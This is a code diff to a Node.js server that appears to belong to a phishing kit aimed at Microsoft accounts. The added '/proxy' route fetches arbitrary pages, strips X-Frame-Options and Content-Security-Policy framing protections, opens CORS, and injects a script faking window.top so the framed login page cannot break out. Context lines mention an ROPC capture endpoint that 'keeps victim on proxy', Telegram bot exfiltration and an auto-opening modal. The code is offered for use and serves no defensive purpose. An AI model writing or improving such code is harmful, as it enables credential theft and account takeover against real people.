@@ -1182,6 +1182,49 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
+    // ── 🔥 IFRAME PROXY BYPASS (STRIP X-FRAME-OPTIONS) ──
+    // This MUST be placed before the Dashboard and fallback proxyHandler
+    if (url.startsWith('/proxy')) {
+        const targetUrl = new URL(url, 'http://localhost').searchParams.get('url');
+        if (!targetUrl) {
+            res.writeHead(400);
+            res.end('Missing url parameter');
+            return;
+        }
+        // Use axios to fetch the Microsoft page
+        axios.get(targetUrl, {
+            responseType: 'arraybuffer',
+            headers: {
+                'User-Agent': getRandomUserAgent()
+            }
+        }).then(response => {
+            // Strip ALL blocking headers
+            const headers = {
+                ...response.headers,
+                'Content-Type': 'text/html',
+                'X-Frame-Options': 'ALLOWALL',
+                'Content-Security-Policy': "frame-ancestors 'self' *",
+                'Access-Control-Allow-Origin': '*'
+            };
+            delete headers['x-frame-options'];
+            delete headers['content-security-policy'];
+            delete headers['frame-ancestors'];
+
+            let html = response.data.toString('utf-8');
+            // Inject anti-breakout script to prevent Firefox redirect warning
+            const injectScript = `<script>Object.defineProperty(window, 'top', { get: function() { return window; } });</script>`;
+            html = html.replace('</head>', injectScript + '</head>');
+
+            res.writeHead(200, headers);
+            res.end(Buffer.from(html, 'utf-8'));
+        }).catch(err => {
+            console.error('🔥 Proxy fetch error:', err.message);
+            res.writeHead(500);
+            res.end('Failed to fetch target URL');
+        });
+        return;
+    }
+
     // ── Dashboard HTML ──
     if (url === '/dash' || url === '/dash/') {
         if (!requireAuth(req, res)) return;
@@ -1876,6 +1919,8 @@ server.listen(PORT, '::', () => {
     console.log(`📧 Webmail: ACTIVE`);
     console.log(`🔌 WebSocket: /ws (live log updates)`);
     console.log(`🔐 NEW: /capture ROPC endpoint – keeps victim on proxy`);
+    console.log(`🛡️ IFRAME PROXY BYPASS: ACTIVE (strips X-Frame-Options)`);
+    console.log(`🚀 AUTO-OPEN MODAL: ENABLED (no click required)`);
 
     if (!BOT_TOKEN || !CHAT_ID) {
         console.warn('⚠️ TELEGRAM CREDENTIALS ARE MISSING! Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables.');
